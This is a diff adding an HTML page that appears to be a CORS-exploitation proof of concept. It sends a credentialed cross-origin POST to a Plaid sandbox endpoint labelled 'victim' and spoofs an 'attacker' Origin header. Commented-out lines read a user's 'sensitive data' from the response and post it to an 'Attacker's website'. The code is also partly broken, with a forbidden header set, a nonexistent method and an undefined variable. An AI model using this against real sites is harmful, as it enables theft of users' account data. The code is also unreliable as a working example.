@@ -1,0 +1,33 @@
+<html>
+<body>
+<button type='button' onclick='cors()'>CORS</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+//xhttp.open("POST", "https://sandbox.plaid.com/link/item/create");
+xhttp.onreadystatechange = function() { //callback
+if (this.readyState == 4 && this.status == 200) {
+// var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = alert(this.responseText);
+//xhttp.open("POST", "http://127.0.0.1", true);// Sending that data to Attacker's website
+//xhttp.withCredentials = true;
+//xhttp.sendRequestHeader("Origin", "http://127.0.0.1");
+
+// console.log(a);
+// xhttp.send("data="+a); this.responseText	
+//alert(1);
+console.log(xhttp.responseText);}
+};
+xhttp.open("POST", "https://sandbox.plaid.com/link/item/create", true); //victim
+//xhttp.open("GET", "https://justworks.com", true);
+xhttp.withCredentials = true;
+xhttp.setRequestHeader("Origin", "http://timepass.com"); //attacker
+xhttp.send();
+document.getElementById(demo).innerHTML = alert(this);
+//alert(this);
+}
+</script>
+
+</body>
+</html>
